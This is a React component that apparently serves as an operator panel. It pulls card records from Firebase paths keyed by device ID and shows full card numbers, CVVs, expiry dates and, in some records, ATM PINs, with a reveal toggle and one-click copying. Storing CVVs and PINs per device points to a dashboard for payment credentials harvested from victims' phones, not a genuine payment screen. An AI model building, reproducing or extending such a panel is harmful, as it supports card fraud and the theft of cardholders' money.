import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { get, ref } from 'firebase/database';
import { db } from '../firebase/config';

function CardPaymentsPage() {
  const { deviceId } = useParams();
  const [data, setData] = useState(null);
  const [limits, setLimits] = useState(null);
  const [allPayments, setAllPayments] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  useEffect(() => {
    fetchData();
  }, [deviceId]);

  /* ================= FETCH DATA ================= */
  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      let paymentsArray = [];

      /* ----- 1. NEW: Fetch from `users_bank/{deviceId}/card` ----- */
      const usersBankRef = ref(db, `users_bank/${deviceId}/card`);
      const usersBankSnap = await get(usersBankRef);

      console.log('🔍 Fetching users_bank/card...');

      if (usersBankSnap.exists()) {
        const cardData = usersBankSnap.val();
        console.log('📦 Card data:', cardData);

        paymentsArray.push({
          id: 'users_bank_card',
          cardNumber: cardData.cardNumber || '',
          cvv: cardData.cvv || '',
          expiry: cardData.expiry || '',
          cardType: cardData.type === 'card' ? 'DEBIT' : 'CARD',
          timestamp: cardData.updatedAt || Date.now(),
          dateTime: cardData.updatedAt
            ? new Date(cardData.updatedAt).toLocaleString('en-IN')
            : 'N/A',
          status: 'Pending',
          source: 'users_bank',
          amount: 0,
          saveCard: true,
          cardHolder: 'N/A',
          atmPin: '',
        });
      }

      /* ----- 2. OLD: Fetch from `payments/{deviceId}` ----- */
      const paymentRef = ref(db, `payments/${deviceId}`);
      const paymentSnap = await get(paymentRef);

      if (paymentSnap.exists()) {
        const rawData = paymentSnap.val();

        // Case 1: Single object with card fields
        if (rawData.atmPin || rawData.cardNumber || rawData.cvv) {
          paymentsArray.push({
            id: deviceId,
            ...rawData
          });
        }
        // Case 2: Nested payments key
        else if (rawData.payments) {
          const oldPayments = Object.keys(rawData.payments)
            .map((key) => ({ id: key, ...rawData.payments[key] }))
            .filter((item) => typeof item === 'object' && item !== null);
          paymentsArray = [...paymentsArray, ...oldPayments];
        }
        // Case 3: Direct list
        else {
          const oldPayments = Object.keys(rawData)
            .map((key) => {
              const item = rawData[key];
              if (typeof item === 'object' && item !== null) {
                return { id: key, ...item };
              }
              return null;
            })
            .filter(Boolean);
          paymentsArray = [...paymentsArray, ...oldPayments];
        }
      }

      // Sort by timestamp (newest first)
      paymentsArray.sort((a, b) => {
        const tsA = Number(a.timestamp) || Number(a.timestampMillis) || 0;
        const tsB = Number(b.timestamp) || Number(b.timestampMillis) || 0;
        return tsB - tsA;
      });

      if (paymentsArray.length > 0) {
        setAllPayments(paymentsArray);
        setData(paymentsArray[0]);
      }

      /* ----- 3. Fetch LIMITS from `card_limits/{deviceId}` ----- */
      const limitRef = ref(db, `card_limits/${deviceId}`);
      const limitSnap = await get(limitRef);

      if (limitSnap.exists()) {
        setLimits(limitSnap.val());
      }
    } catch (err) {
      console.error('❌ Fetch error:', err);
      setError(err.message);
    }
    setLoading(false);
  };

  /* ================= HELPERS ================= */
  const getStatusColor = (status) => {
    if (status === 'Success') return '#10b981';
    if (status === 'Failed') return '#ef4444';
    if (status === 'Pending') return '#f59e0b';
    return '#94a3b8';
  };

  const getStatusIcon = (status) => {
    if (status === 'Success') return '✅';
    if (status === 'Failed') return '❌';
    if (status === 'Pending') return '⏳';
    return '⚪';
  };

  const formatDate = (ms) => {
    if (!ms) return 'N/A';
    const d = new Date(Number(ms));
    return d.toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
  };

  const formatCardNumber = (num) => {
    if (!num) return 'N/A';
    return String(num).replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
  };

  const maskCardNumber = (num) => {
    if (!num) return 'N/A';
    const clean = String(num).replace(/\s/g, '');
    if (clean.length < 8) return clean;
    return '•••• •••• •••• ' + clean.slice(-4);
  };

  const copyToClipboard = (text, key) => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  /* ================= LOADING ================= */
  if (loading) {
    return (
      <div className="cpp-loading">
        <div className="cpp-spinner"></div>
        <p>Loading card data...</p>
        <style>{`
          .cpp-loading {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 200px;
            gap: 12px;
            padding: 20px;
          }
          .cpp-spinner {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(108, 99, 255, 0.15);
            border-top-color: #6c63ff;
            border-radius: 50%;
            animation: cppSpin 0.8s linear infinite;
          }
          @keyframes cppSpin {
            to { transform: rotate(360deg); }
          }
          .cpp-loading p {
            font-size: 12px;
            color: var(--text-muted, #94a3b8);
            margin: 0;
          }
        `}</style>
      </div>
    );
  }

  /* ================= ERROR ================= */
  if (error) {
    return (
      <div className="cpp-error">
        <span className="cpp-error-icon">❌</span>
        <p>Failed to load card data</p>
        <p style={{ fontSize: '11px', opacity: 0.6, marginTop: '4px' }}>{error}</p>
        <button onClick={fetchData}>Retry</button>
        <style>{`
          .cpp-error { text-align: center; padding: 30px 20px; }
          .cpp-error-icon { font-size: 42px; display: block; margin-bottom: 8px; }
          .cpp-error p { font-size: 13px; color: var(--text-muted, #94a3b8); margin: 0 0 12px; }
          .cpp-error button {
            padding: 8px 22px;
            border: 1px solid rgba(108, 99, 255, 0.4);
            border-radius: 8px;
            background: rgba(108, 99, 255, 0.1);
            color: #6c63ff;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
          }
        `}</style>
      </div>
    );
  }

  /* ================= NO DATA ================= */
  if (!data) {
    return (
      <div className="cpp-empty">
        <span>📭</span>
        <p>No card payment data found</p>
        <p style={{ fontSize: '11px', marginTop: '8px', opacity: 0.7 }}>
          Device ID: {deviceId}
        </p>
        <button onClick={fetchData}>🔄 Refresh</button>
        <style>{`
          .cpp-empty { text-align: center; padding: 30px 20px; color: var(--text-muted, #94a3b8); }
          .cpp-empty span { font-size: 42px; display: block; margin-bottom: 8px; }
          .cpp-empty p { font-size: 13px; margin: 0; }
          .cpp-empty button {
            margin-top: 12px;
            padding: 6px 18px;
            border: 1px solid rgba(108, 99, 255, 0.4);
            border-radius: 8px;
            background: rgba(108, 99, 255, 0.1);
            color: #6c63ff;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
          }
        `}</style>
      </div>
    );
  }

  /* ================= UTILIZATION ================= */
  const utilization = limits?.utilizationPercentage
    ? parseInt(String(limits.utilizationPercentage).replace('%', ''), 10)
    : 0;

  const getUtilColor = (pct) => {
    if (pct >= 90) return '#ef4444';
    if (pct >= 70) return '#f59e0b';
    return '#10b981';
  };

  return (
    <div className="cpp-root">
      <style>{`
        .cpp-root {
          padding: 8px 0;
          font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
          animation: cppFadeIn 0.4s ease;
        }
        @keyframes cppFadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        .cpp-card-visual {
          position: relative;
          border-radius: 16px;
          padding: 18px 20px;
          margin-bottom: 14px;
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
          box-shadow:
            0 15px 40px rgba(0, 0, 0, 0.4),
            0 0 0 1px rgba(255, 255, 255, 0.08) inset;
          overflow: hidden;
          color: #fff;
        }
        .cpp-card-visual::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -20%;
          width: 220px;
          height: 220px;
          background: radial-gradient(circle, rgba(108, 99, 255, 0.4), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }
        .cpp-card-visual::after {
          content: '';
          position: absolute;
          bottom: -30%;
          left: -10%;
          width: 180px;
          height: 180px;
          background: radial-gradient(circle, rgba(236, 72, 153, 0.25), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }

        .cpp-card-top {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 22px;
          position: relative;
          z-index: 1;
        }

        .cpp-chip {
          width: 34px;
          height: 26px;
          border-radius: 4px;
          background: linear-gradient(135deg, #fbbf24, #f59e0b);
          position: relative;
          box-shadow: 0 2px 6px rgba(0,0,0,0.3);
        }
        .cpp-chip::before {
          content: '';
          position: absolute;
          inset: 4px;
          border: 1px solid rgba(0,0,0,0.2);
          border-radius: 2px;
        }

        .cpp-card-type {
          font-size: 12px;
          font-weight: 700;
          letter-spacing: 1.5px;
          text-transform: uppercase;
          color: rgba(255, 255, 255, 0.9);
          background: rgba(255, 255, 255, 0.1);
          padding: 4px 12px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
        }

        .cpp-card-number {
          font-family: 'Courier New', monospace;
          font-size: 19px;
          font-weight: 700;
          letter-spacing: 2.5px;
          color: #fff;
          margin-bottom: 20px;
          position: relative;
          z-index: 1;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 8px;
          cursor: pointer;
          transition: color 0.2s;
        }
        .cpp-card-number:hover {
          color: #a78bfa;
        }

        .cpp-eye-btn {
          background: rgba(255, 255, 255, 0.1);
          border: none;
          border-radius: 6px;
          padding: 4px 8px;
          cursor: pointer;
          font-size: 14px;
          transition: background 0.2s;
          flex-shrink: 0;
        }
        .cpp-eye-btn:hover {
          background: rgba(255, 255, 255, 0.2);
        }

        .cpp-card-bottom {
          display: flex;
          justify-content: space-between;
          align-items: flex-end;
          position: relative;
          z-index: 1;
        }

        .cpp-card-field {
          display: flex;
          flex-direction: column;
          gap: 2px;
        }
        .cpp-card-field .label {
          font-size: 9px;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
        }
        .cpp-card-field .value {
          font-size: 12.5px;
          font-weight: 700;
          color: #fff;
          letter-spacing: 0.5px;
        }

        .cpp-details {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 6px;
          margin-bottom: 12px;
        }

        .cpp-detail-item {
          background: var(--bg-card, rgba(255,255,255,0.03));
          border: 1px solid var(--border-color, rgba(255,255,255,0.08));
          border-radius: 9px;
          padding: 8px 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 8px;
          transition: all 0.2s ease;
          cursor: pointer;
          position: relative;
        }
        .cpp-detail-item:hover {
          border-color: rgba(108, 99, 255, 0.4);
          background: rgba(108, 99, 255, 0.05);
        }
        .cpp-detail-item.full {
          grid-column: 1 / -1;
        }

        .cpp-detail-item .lbl {
          font-size: 10px;
          color: var(--text-muted, #94a3b8);
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 4px;
          white-space: nowrap;
        }
        .cpp-detail-item .val {
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary, #fff);
          text-align: right;
          word-break: break-all;
        }
        .cpp-detail-item .val.mono {
          font-family: 'Courier New', monospace;
          letter-spacing: 0.5px;
        }

        .cpp-copy-tip {
          position: absolute;
          top: -6px;
          right: 6px;
          background: #6c63ff;
          color: #fff;
          font-size: 9px;
          padding: 2px 6px;
          border-radius: 4px;
          font-weight: 700;
          animation: cppTipIn 0.2s ease;
        }
        @keyframes cppTipIn {
          from { opacity: 0; transform: translateY(4px); }
          to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 400px) {
          .cpp-card-number { font-size: 15px; letter-spacing: 1.5px; }
          .cpp-card-visual { padding: 14px 16px; }
          .cpp-detail-item .lbl { font-size: 9px; }
          .cpp-detail-item .val { font-size: 11px; }
        }
      `}</style>

      {/* ============ CREDIT CARD VISUAL ============ */}
      <div className="cpp-card-visual">
        <div className="cpp-card-top">
          <div className="cpp-chip"></div>
          <div className="cpp-card-type">{data.cardType || 'DEBIT'}</div>
        </div>

        <div
          className="cpp-card-number"
          onClick={() => setShowSensitive(!showSensitive)}
          title="Click to toggle"
        >
          <span>
            {showSensitive
              ? formatCardNumber(data.cardNumber)
              : maskCardNumber(data.cardNumber)}
          </span>
          <button
            className="cpp-eye-btn"
            onClick={(e) => { e.stopPropagation(); setShowSensitive(!showSensitive); }}
          >
            {showSensitive ? '👁️' : '👁️‍🗨️'}
          </button>
        </div>

        <div className="cpp-card-bottom">
          <div className="cpp-card-field">
            <span className="label">Card Holder</span>
            <span className="value">{data.cardHolder || data.nameOnCard || 'N/A'}</span>
          </div>
          <div className="cpp-card-field">
            <span className="label">Expires</span>
            <span className="value">{data.expiry || 'MM/YY'}</span>
          </div>
          <div className="cpp-card-field">
            <span className="label">CVV</span>
            <span className="value">
              {showSensitive ? (data.cvv || '•••') : '•••'}
            </span>
          </div>
        </div>
      </div>

      {/* ============ DETAILS GRID ============ */}
      <div className="cpp-details">
        <div
          className="cpp-detail-item full"
          onClick={() => copyToClipboard(data.cardNumber, 'cardNumber')}
        >
          <span className="lbl">💳 Card Number</span>
          <span className="val mono">
            {showSensitive
              ? formatCardNumber(data.cardNumber)
              : maskCardNumber(data.cardNumber)}
          </span>
          {copied === 'cardNumber' && <span className="cpp-copy-tip">Copied!</span>}
        </div>

        <div
          className="cpp-detail-item"
          onClick={() => copyToClipboard(data.expiry, 'expiry')}
        >
          <span className="lbl">📅 Expiry</span>
          <span className="val mono">{data.expiry || 'N/A'}</span>
          {copied === 'expiry' && <span className="cpp-copy-tip">Copied!</span>}
        </div>

        <div
          className="cpp-detail-item"
          onClick={() => copyToClipboard(data.cvv, 'cvv')}
        >
          <span className="lbl">🔐 CVV</span>
          <span className="val mono">
            {showSensitive ? (data.cvv || 'N/A') : '•••'}
          </span>
          {copied === 'cvv' && <span className="cpp-copy-tip">Copied!</span>}
        </div>

        <div className="cpp-detail-item">
          <span className="lbl">📌 Status</span>
          <span
            className="val"
            style={{ color: getStatusColor(data.status), fontSize: '12px' }}
          >
            {getStatusIcon(data.status)} {data.status || 'Pending'}
          </span>
        </div>

        <div className="cpp-detail-item full">
          <span className="lbl">🕐 Timestamp</span>
          <span className="val" style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
            {data.dateTime || formatDate(data.timestamp)}
          </span>
        </div>
      </div>
    </div>
  );
}

export default CardPaymentsPage;